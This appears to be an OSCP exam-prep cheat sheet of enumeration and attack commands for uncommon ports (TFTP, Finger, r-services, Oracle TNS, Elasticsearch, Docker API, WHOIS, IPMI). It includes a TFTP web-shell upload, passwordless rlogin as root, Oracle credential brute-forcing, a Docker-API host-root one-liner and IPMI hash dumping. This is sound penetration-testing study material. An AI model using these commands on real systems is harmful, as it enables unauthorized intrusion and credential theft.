## Goal
Quick reference for less-common ports so you never skip one. Each is rare on OSCP but does appear — enumerate it, don't ignore it.

> A port that isn't listed here, a product on a non-standard port, or an `unknown`/`tcpwrapped` result → fingerprint it with [[unknown_service_triage]] (separate protocol identity from the port number).

# Commands

### TFTP (UDP 69) — no-auth file read/write
```bash
nmap -sU -p69 --script tftp-enum $IP
tftp $IP
# get <known_filename>     # NO directory listing -> you must guess names (config, backup)
# put shell.php            # write (into a webroot?)
```

### Finger (79) — user enumeration
```bash
finger @$IP ; finger root@$IP
finger-user-enum.pl -U users.txt -t $IP
```

### R-services (512 rexec / 513 rlogin / 514 rsh)
```bash
nmap -p512,513,514 -sV $IP
rlogin $IP -l root           # .rhosts trust misconfig -> shell, no password
```

### Oracle TNS (1521)
```bash
nmap -p1521 --script "oracle-tns-version,oracle-sid-brute" $IP
odat sidguesser -s $IP -p 1521                  # find SIDs
odat passwordguesser -s $IP -p 1521 -d <SID>    # brute creds
sqlplus user/pass@$IP:1521/<SID>
```

### Elasticsearch (9200)
```bash
curl "http://$IP:9200/_cat/indices?v"                     # list indices (no auth?)
curl "http://$IP:9200/<index>/_search?pretty&size=100"    # dump docs (creds?)
```

### Docker API (2375/2376) — instant host root
```bash
curl http://$IP:2375/version
docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh   # root on the host fs
```

### WHOIS (TCP 43) — identity/contact/domain clues
```bash
nc -vn $IP 43            # then type a query (a domain or name) + Enter; read the record
whois -h $IP <query>     # query a self-hosted whois service directly
```
Record from the response: registrant/contact **names + emails** (→ usernames), **domains/subdomains** (→ /etc/hosts, [[53_dns]], vhost fuzzing), and mail/nameserver hosts (→ 25/110/143). Feed names/emails into the credential/reuse workflow ([[default_creds_logins]] · [[99_STUCK_RESET]] reuse matrix). Rare on OSCP; when a box runs its own whois it's an identity source, not an exploit target.

### IPMI (UDP 623) — hash dump
```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP
# msf auxiliary/scanner/ipmi/ipmi_dumphashes -> crack the RAKP hashes offline
```

### Helpline
```bash
# WHAT TO LOOK FOR:
#   TFTP has NO listing -> guess filenames (config.txt, backup, running-config, .conf).
#   r-services trust misconfig (rlogin/rsh) = passwordless root shell.
#   Docker API on 2375 = instant host root (mount / into a container).
#   Elasticsearch / Mongo / Redis = usually no auth -> just read the data for creds.
#   IPMI cipher-zero / RAKP -> dump and crack admin hashes offline.
```
